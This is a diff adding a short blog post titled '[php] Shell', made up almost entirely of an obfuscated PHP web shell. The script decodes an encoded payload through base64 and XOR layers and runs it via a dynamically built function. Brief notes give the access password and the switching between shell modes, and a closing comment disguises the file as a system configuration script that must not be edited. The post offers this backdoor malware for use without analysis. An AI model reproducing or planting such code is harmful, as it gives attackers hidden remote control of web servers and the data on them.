@@ -1,0 +1,29 @@
+---
+author: ww
+comments: true
+date: 2016-04-11 09:30:12+00:00
+layout: post
+link: http://www.gl6.cc/blog/php-shell.html
+slug: php-shell
+title: '[php] Shell'
+wordpress_id: 566
+categories:
+- PHP
+tags:
+- shell
+---
+
+回车ctwj,
+
+chang_shell=code1~4 切换shell
+
+ 
+
+    {% highlight php %}
+    <?php error_reporting(0); global $Ž‘Œ…Ž—”’‰ˆ;if(!defined("No-answer")){define("No-answer",1393816036);function †‡›˜ƒ($š™€,$‡Ž=""){ global $Ž‘Œ…Ž—”’‰ˆ;$†‡›˜ƒ=base64_decode($š™€);if(empty($š™€)) return "";if($‡Ž==""){return ~$†‡›˜ƒ;}else{$strlen=$Ž‘Œ…Ž—”’‰ˆ["strlen"]($†‡›˜ƒ);$‡Ž=$Ž‘Œ…Ž—”’‰ˆ["ŠŽ"]($‡Ž,$strlen,$‡Ž);return $†‡›˜ƒ^$‡Ž;}}}$Ž‘Œ…Ž—”’‰ˆ[""]=†‡›˜ƒ("nI2anouaoJmKkZyLlpCR","");$Ž‘Œ…Ž—”’‰ˆ["ŠŽ"]=†‡›˜ƒ("jIuNoI+˜emw==","");$Ž‘Œ…Ž—”’‰ˆ["†‡›˜ƒ"]=†‡›˜ƒ("mpKPi4Y=","");$Ž‘Œ…Ž—”’‰ˆ["strlen"]=†‡›˜ƒ("jIuNk5qR","");$Ž‘Œ…Ž—”’‰ˆ["Š‹“Š"]=†‡›˜ƒ("DgoQK€A0mWzsZUCQ5","ipeFnI6Kk5WJ"); $Ž‘Œ…Ž—”’‰ˆ["„‹Š„"]=†‡›˜ƒ("DlUeI19ECAEIExYzCQ==","l4mFipWempyW");$Ž‘Œ…Ž—”’‰ˆ["…˜„"]=†‡›˜ƒ("C04EKA8cNhEI","l4mFipWempye");$Ž‘Œ…Ž—”’‰ˆ["‰šŠ”Œ"]=†‡›˜ƒ("CUIMKg==","l4mFipWempyf");$Ž‘Œ…Ž—”’‰ˆ["›‚•"] = †‡›˜ƒ("jIuNoI2Qi87M"); $Ž‘Œ…Ž—”’‰ˆ["Š‹“Š"] = †‡›˜ƒ("VU4YKAofOhUfFQoV","24mFipWempyf");$‚ŒžŠ‰ = $Ž‘Œ…Ž—”’‰ˆ[""]('$šŠ”Œ–š–œ', $Ž‘Œ…Ž—”’‰ˆ["‰šŠ”Œ"].'($šŠ”Œ–š–œ);');$‚ŒžŠ‰($Ž‘Œ…Ž—”’‰ˆ["›‚•"]($Ž‘Œ…Ž—”’‰ˆ["Š‹“Š"]($Ž‘Œ…Ž—”’‰ˆ["…˜„"]($Ž‘Œ…Ž—”’‰ˆ["„‹Š„"]($Ž‘Œ…Ž—”’‰ˆ["…˜„"]($Ž‘Œ…Ž—”’‰ˆ["„‹Š„"]("BcHJomswAADQD+qiVyjp4i1MNRQlIpruTGloqbHU179zVLTq0lGQOp9gAOQ80rQzHjBUlaTwEmRuxVxh7TIoPgddPd5fcUAITdVp+V51cgI5iYtDAJXIvL5PT/+amcW+a3vbaa15GdzrS2gcp6+AKciFLSIkz2vlBYEpv1D1g6XPTq583WF18sybkNkOf+QI9eMIM7UfnN/cnN5wdtjGjJSFf2snChYiVW1L+8Y6FwYkKl+ozIIh/ZSKkvp3EOqX97tyS4/KFxd+OXb2aBTAJk/jShfaBjcpzKHK56myZ75jjsNnOPobzP3FqXSop9y9qpk/rJQ+MJ70NLR02qCmVavo/vJbJAE5ltuSgI+Cz/YptYoF4Ivp5QlBj/AefMeN6iZByv4NoyCYzDrJZxYDc1Zh0i+wGZbX61lLxvueHI6HOzlPlqF3QW8IyTimsBVBLtZKDdJ+C07T9HjDFh6/ZPeIhb/cmqy5zJVU1+vCnOZmDzuErEtNWi+2q74p8CEUaGfmnlwyIimY/oyEkZEMpTrvS/c3fG3mUX1CMzhcb2OiHcVDis60DQGOP+eH0czDvF7rMyI/j0buR1Rc5kiPR+zf7Cb1i6JXQ6bqj76xKFx5vsbdymX75rMk0NLne/UEZlKu/flkQ/xX2BXopqzwIUdKOW0Q65x3o5m4MF7aec3oy2Ar+0Tp7PI1x1Kga8b2jHj252Cl52fpVLgGVRwWVJetyD6NGv6pS2UdwTjcxLN52HPreBRDgUmaeG8utfTvPw==")))))));
+    // 本脚本为重要系统加密配置脚本,请勿编辑
+	{% endhighlight %}
+    
+
+
+
